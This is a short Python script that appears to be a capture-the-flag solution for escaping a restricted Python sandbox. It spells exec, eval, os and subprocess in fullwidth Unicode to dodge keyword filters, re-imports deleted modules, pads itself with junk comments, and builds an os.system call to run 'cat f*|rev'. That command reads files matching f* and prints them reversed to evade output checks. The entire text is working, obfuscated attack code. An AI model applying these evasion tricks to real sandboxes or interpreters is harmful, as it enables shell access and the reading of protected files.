import ｓubprocess
import ｓｙｓ as a
import ｏｓ
from ｓｙｓ import modules as q

try:
    del q["o" + "s"]
    del q["sub" + "pro" + "cess"]
except:
    pass
import ｓubprocess
import ｏｓ

# importIib
# 1qaz2wxse3ecvnbcerkfjhb345m6,nboiu
print("a" * 700)
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
try:
    ｅｘｅｃ("o" + "s.sy" + "stem" + '("ca' + "t " + 'f*|rev")')

except:
    pass
try:
    ｅval("o" + "s.sy" + "stem")("ca" + "t " + "f*|rev")
except:
    pass
